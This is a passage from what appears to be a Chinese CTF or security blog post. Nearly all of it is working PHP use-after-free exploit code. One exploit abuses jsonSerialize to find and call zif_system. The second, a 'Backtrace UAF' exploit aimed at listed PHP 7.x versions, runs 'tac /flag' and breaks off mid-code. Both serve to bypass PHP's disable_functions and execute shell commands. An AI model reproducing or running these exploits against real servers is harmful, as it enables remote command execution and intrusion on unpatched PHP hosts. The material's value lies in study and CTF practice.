&lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-keyword">$this</span>-&gt;leak2(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;bin2hex&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-keyword">$this</span>-&gt;leak2(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123; <span class="hljs-comment"># ELF header</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-keyword">$this</span>-&gt;leak2(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-keyword">$this</span>-&gt;leak2(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123; <span class="hljs-comment"># system</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;leak2(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jsonSerialize</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$y</span>, <span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$spl1</span>, <span class="hljs-variable">$fake_tbl_off</span>, <span class="hljs-variable">$n_alloc</span>;<br><br>        <span class="hljs-variable">$contiguous</span> = [];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>            <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-keyword">new</span> DateInterval(<span class="hljs-string">&#x27;PT1S&#x27;</span>);<br><br>        <span class="hljs-variable">$room</span> = [];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>            <span class="hljs-variable">$room</span>[] = <span class="hljs-keyword">new</span> Z();<br><br>        <span class="hljs-variable">$_protector</span> = <span class="hljs-keyword">$this</span>-&gt;ptr2str(<span class="hljs-number">0</span>, <span class="hljs-number">78</span>);<br><br>        <span class="hljs-keyword">$this</span>-&gt;abc = <span class="hljs-keyword">$this</span>-&gt;ptr2str(<span class="hljs-number">0</span>, <span class="hljs-number">79</span>);<br>        <span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> DateInterval(<span class="hljs-string">&#x27;PT1S&#x27;</span>);<br><br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$y</span>[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$p</span>);<br><br>        <span class="hljs-variable">$protector</span> = <span class="hljs-string">&quot;.<span class="hljs-subst">$_protector</span>&quot;</span>;<br><br>        <span class="hljs-variable">$x</span> = <span class="hljs-keyword">new</span> DateInterval(<span class="hljs-string">&#x27;PT1S&#x27;</span>);<br>        <span class="hljs-variable">$x</span>-&gt;d = <span class="hljs-number">0x2000</span>;<br>        <span class="hljs-variable">$x</span>-&gt;h = <span class="hljs-number">0xdeadbeef</span>;<br>        <span class="hljs-comment"># $this-&gt;abc is now of size 0x2000</span><br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;str2ptr(<span class="hljs-keyword">$this</span>-&gt;abc) != <span class="hljs-number">0xdeadbeef</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;UAF failed.&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$spl1</span> = <span class="hljs-keyword">new</span> MySplFixedArray();<br>        <span class="hljs-variable">$spl2</span> = <span class="hljs-keyword">new</span> MySplFixedArray();<br><br>        <span class="hljs-comment"># some leaks</span><br>        <span class="hljs-variable">$class_entry</span> = <span class="hljs-keyword">$this</span>-&gt;str2ptr(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x120</span>);<br>        <span class="hljs-variable">$handlers</span> = <span class="hljs-keyword">$this</span>-&gt;str2ptr(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x128</span>);<br>        <span class="hljs-variable">$php_heap</span> = <span class="hljs-keyword">$this</span>-&gt;str2ptr(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x1a8</span>);<br>        <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0x218</span>;<br><br>        <span class="hljs-comment"># create a fake class_entry</span><br>        <span class="hljs-variable">$fake_obj</span> = <span class="hljs-variable">$abc_addr</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>); <span class="hljs-comment"># type</span><br>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x120</span>, <span class="hljs-variable">$abc_addr</span>); <span class="hljs-comment"># fake class_entry</span><br><br>        <span class="hljs-comment"># copy some of class_entry definition</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">16</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x10</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>, <br>                <span class="hljs-keyword">$this</span>-&gt;leak1(<span class="hljs-variable">$class_entry</span> + <span class="hljs-number">0x10</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>));<br>        &#125;<br><br>        <span class="hljs-comment"># fake static members table</span><br>        <span class="hljs-variable">$fake_tbl_off</span> = <span class="hljs-number">0x70</span> * <span class="hljs-number">4</span> - <span class="hljs-number">16</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x30</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_tbl_off</span>);<br>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x38</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_tbl_off</span>);<br><br>        <span class="hljs-comment"># fake zval_reference</span><br>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-variable">$fake_tbl_off</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_tbl_off</span> + <span class="hljs-number">0x10</span>); <span class="hljs-comment"># zval</span><br>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-variable">$fake_tbl_off</span> + <span class="hljs-number">8</span>, <span class="hljs-number">10</span>); <span class="hljs-comment"># zval type (reference)</span><br><br>        <span class="hljs-comment"># look for binary base</span><br>        <span class="hljs-variable">$binary_leak</span> = <span class="hljs-keyword">$this</span>-&gt;leak2(<span class="hljs-variable">$handlers</span> + <span class="hljs-number">0x10</span>);<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-keyword">$this</span>-&gt;get_binary_base(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment"># parse elf header</span><br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-keyword">$this</span>-&gt;parse_elf(<span class="hljs-variable">$base</span>))) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment"># get basic_functions address</span><br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-keyword">$this</span>-&gt;get_basic_funcs(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment"># find system entry</span><br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-keyword">$this</span>-&gt;get_system(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>        &#125;<br>        <br>        <span class="hljs-comment"># copy hashtable offsetGet bucket</span><br>        <span class="hljs-variable">$fake_bkt_off</span> = <span class="hljs-number">0x70</span> * <span class="hljs-number">5</span> - <span class="hljs-number">16</span>;<br><br>        <span class="hljs-variable">$function_data</span> = <span class="hljs-keyword">$this</span>-&gt;str2ptr(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x50</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">4</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-variable">$fake_bkt_off</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>, <br>                <span class="hljs-keyword">$this</span>-&gt;leak2(<span class="hljs-variable">$function_data</span> + <span class="hljs-number">0x40</span> * <span class="hljs-number">4</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>));<br>        &#125;<br><br>        <span class="hljs-comment"># create a fake bucket</span><br>        <span class="hljs-variable">$fake_bkt_addr</span> = <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_bkt_off</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x50</span>, <span class="hljs-variable">$fake_bkt_addr</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">3</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x58</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>);<br>        &#125;<br><br>        <span class="hljs-comment"># copy bucket zval</span><br>        <span class="hljs-variable">$function_zval</span> = <span class="hljs-keyword">$this</span>-&gt;str2ptr(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-variable">$fake_bkt_off</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">12</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc,  <span class="hljs-variable">$fake_bkt_off</span> + <span class="hljs-number">0x70</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>, <br>                <span class="hljs-keyword">$this</span>-&gt;leak2(<span class="hljs-variable">$function_zval</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>));<br>        &#125;<br><br>        <span class="hljs-comment"># pwn</span><br>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-variable">$fake_bkt_off</span> + <span class="hljs-number">0x70</span> + <span class="hljs-number">0x30</span>, <span class="hljs-variable">$zif_system</span>);<br>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-variable">$fake_bkt_off</span>, <span class="hljs-variable">$fake_bkt_addr</span> + <span class="hljs-number">0x70</span>);<br><br>        <span class="hljs-variable">$spl1</span>-&gt;offsetGet(<span class="hljs-variable">$cmd</span>);<br><br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$y</span> = [<span class="hljs-keyword">new</span> Z()];<br>json_encode([&amp;<span class="hljs-variable">$y</span>]);<br></code></pre></td></tr></table></figure><h2 id="Backtrace-UAF"><a href="#Backtrace-UAF" class="headerlink" title="Backtrace UAF"></a>Backtrace UAF</h2><p>版本限制：</p><ul><li>7.0 - all versions to date</li><li>7.1 - all versions to date</li><li>7.2 - all versions to date</li><li>7.3 &lt; 7.3.15 (released 20 Feb 2020)</li><li>7.4 &lt; 7.4.3 (released 20 Feb 2020)</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>pwn(<span class="hljs-string">&quot;tac /flag&quot;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>; <br>            <span class="hljs-keyword">unset</span>(<span class="hljs-keyword">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;getTrace(); <span class="hljs-comment"># ;)</span><br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123; <span class="hljs-comment"># PHP &gt;= 7.4</span><br>                <span class="hljs-variable">$backtrace</span> = debug_backtrace();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= ord(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= chr(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = chr(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = strlen(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_Write</span><br>                <span class="hljs-comment"># handle pie</span><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_exec</span><br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = leak(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span 